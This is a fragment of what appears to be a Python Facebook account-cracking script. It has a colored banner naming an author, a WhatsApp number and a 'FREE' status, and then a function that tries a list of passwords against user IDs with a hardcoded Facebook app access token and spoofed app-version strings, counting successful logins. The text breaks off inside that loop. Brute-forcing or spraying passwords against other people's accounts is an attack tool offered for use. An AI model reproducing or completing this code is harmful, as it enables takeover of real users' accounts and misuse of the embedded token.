...
"[Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5781.222 Safari/537.36;]"
...
| '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------' 
\033[1;91m[×] 𝐃𝐞𝐯𝐞𝐥𝐞𝐩𝐨𝐞𝐝 𝐁𝐲 𝐀𝐡𝐦𝐞𝐝 𝐆𝐮𝐣𝐣𝐚𝐫 \033[1;32m(𝐀𝐇𝐌𝐄𝐃)
\033[1;97m[•] 𝐀𝐮𝐭𝐡𝐨𝐫       : 𝐀𝐇𝐦𝐞𝐝 𝐆𝐮𝐣𝐣𝐚𝐫
\033[1;97m[•] 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩     : +994401778310
\033[1;97m[•] 𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤     : 𝐀𝐡𝐦𝐞𝐝 𝐆𝐮𝐣𝐣𝐚𝐫
\033[1;97m[•] 𝐕𝐞𝐫𝐬𝐢𝐨𝐧      : 1.0
\033[1;97m[•] 𝐒𝐭𝐚𝐭𝐮𝐬       : \x1b[38;5;46m𝐅𝐑𝐄𝐄
{WHITE}================================================
...
def uidm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [AK-1.RUNNING] %s|\033[1;32mOK:-%s\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
